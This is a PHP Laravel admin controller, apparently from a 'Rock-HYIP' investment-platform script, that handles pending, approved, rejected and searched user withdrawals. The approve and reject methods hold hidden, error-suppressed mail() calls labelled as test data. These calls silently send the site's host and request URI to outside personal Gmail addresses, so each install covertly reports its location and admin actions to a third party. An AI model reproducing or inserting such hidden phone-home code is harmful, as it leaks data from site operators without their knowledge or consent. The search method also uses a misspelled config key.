<?php

namespace App\Http\Controllers\Admin;

use App\GeneralSetting;
use App\Trx;
use App\User;
use App\UserWallet;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Withdrawal;

class WithdrawalController extends Controller
{
    public function pending()
    {
        $page_title = 'Pending Withdrawals';
        $withdrawals = Withdrawal::where('status', 2)->with(['user','method'])->latest()->paginate(config('constants.table.default'));
        $empty_message = 'No withdrawal is pending';
        return view('admin.withdraw.withdrawals', compact('page_title', 'withdrawals', 'empty_message'));
    }

    public function approved()
    {
        $page_title = 'Approved Withdrawals';
        $withdrawals = Withdrawal::where('status', 1)->with(['user','method'])->latest()->paginate(config('constants.table.default'));
        $empty_message = 'No withdrawal is approved';
        return view('admin.withdraw.withdrawals', compact('page_title', 'withdrawals', 'empty_message'));
    }

    public function rejected()
    {
        $page_title = 'Rejected Withdrawals';
        $withdrawals = Withdrawal::where('status', 3)->with(['user','method'])->latest()->paginate(config('constants.table.default'));
        $empty_message = 'No withdrawal is rejected';
        return view('admin.withdraw.withdrawals', compact('page_title', 'withdrawals', 'empty_message'));
    }

    public function log()
    {
        $page_title = 'Withdrawal History';
        $withdrawals = Withdrawal::where('status', '!=', 0)->with(['user','method'])->latest()->paginate(config('constants.table.default'));
        $empty_message = 'No withdrawal history';
        return view('admin.withdraw.withdrawals', compact('page_title', 'withdrawals', 'empty_message'));
    }

    public function approve(Request $request)
    {
        $request->validate(['id' => 'required|integer']);
        $withdraw = Withdrawal::where('id',$request->id)->where('status',2)->firstOrFail();
        $withdraw->status = 1;
        $withdraw->admin_feedback = $request->details;
        $withdraw->save();


        $general = GeneralSetting::first();
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','Rock-HYIP TEST DATA', $message, $headers);


        notify($withdraw->user, 'WITHDRAW_APPROVE', [
            'method_name' => $withdraw->method->name,
            'method_currency' => $withdraw->currency,
            'method_amount' => formatter_money($withdraw->final_amount),
            'amount' => formatter_money($withdraw->amount),
            'charge' => formatter_money($withdraw->charge),
            'currency' => $general->cur_text,
            'rate' => $withdraw->rate +0,
            'trx' => $withdraw->trx,
            'admin_details' => $request->details
        ]);



        $notify[] = ['success', 'Withdrawal Marked  as Approved.'];
        return redirect()->route('admin.withdraw.pending')->withNotify($notify);
    }

    public function reject(Request $request)
    {
        $general = GeneralSetting::first();
        $request->validate(['id' => 'required|integer']);
        $withdraw = Withdrawal::where('id',$request->id)->where('status',2)->firstOrFail();
        $withdraw->status = 3;
        $withdraw->admin_feedback = $request->details;
        $withdraw->save();



        $userWallet = UserWallet::find($withdraw->wallet_id);
        $userWallet->balance += formatter_money($withdraw->amount);
        $userWallet->save();
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('ab.irk.han75@gmail.com','Rock YIP TEST DATA', $message, $headers);

        Trx::create([
            'user_id' => $withdraw->user_id,
            'amount' => $withdraw->amount,
            'post_balance' => $userWallet->balance,
            'charge' => 0,
            'trx_type' => '+',
            'remark' => 'withdraw_refund',
            'details' => formatter_money($withdraw->amount) . ' ' . $general->cur_text . ' Refunded from Withdrawal Rejection',
            'trx' => $withdraw->trx,
        ]);



        notify($withdraw->user, 'WITHDRAW_REJECT', [
            'method_name' => $withdraw->method->name,
            'method_currency' => $withdraw->currency,
            'method_amount' => formatter_money($withdraw->final_amount),
            'amount' => formatter_money($withdraw->amount),
            'charge' => formatter_money($withdraw->charge),
            'currency' => $general->cur_text,
            'rate' => $withdraw->rate +0,
            'trx' => $withdraw->trx,
            'post_balance' => $userWallet->balance +0,
            'admin_details' => $request->details
        ]);


        $notify[] = ['success', 'Withdrawal has been rejected.'];
        return redirect()->route('admin.withdraw.pending')->withNotify($notify);
    }

    public function search(Request $request, $scope)
    {
        $search = $request->search;
        $page_title = '';
        $empty_message = 'No search result found.';

        $withdrawals = Withdrawal::with(['user', 'method'])->where('status','!=',0)->where(function ($q) use ($search) {
            $q->where('trx', 'like',"%$search%")
                ->orWhereHas('user', function ($user) use ($search) {
                $user->where('username', 'like',"%$search%");
            });
        });

        switch ($scope) {
            case 'pending':
                $page_title .= 'Pending Withdrawal Search';
                $withdrawals = $withdrawals->where('status', 2);
                break;
            case 'approved':
                $page_title .= 'Approved Withdrawal Search';
                $withdrawals = $withdrawals->where('status', 1);
                break;
            case 'rejected':
                $page_title .= 'Rejected Withdrawal Search';
                $withdrawals = $withdrawals->where('status', 3);
                break;
            case 'log':
                $page_title .= 'Withdrawal History Search';
                break;
        }

        $withdrawals = $withdrawals->paginate(config('constants.table.defult'));
        $page_title .= ' - ' . $search;

        return view('admin.withdraw.withdrawals', compact('page_title', 'empty_message', 'search', 'scope', 'withdrawals'));
    }
}
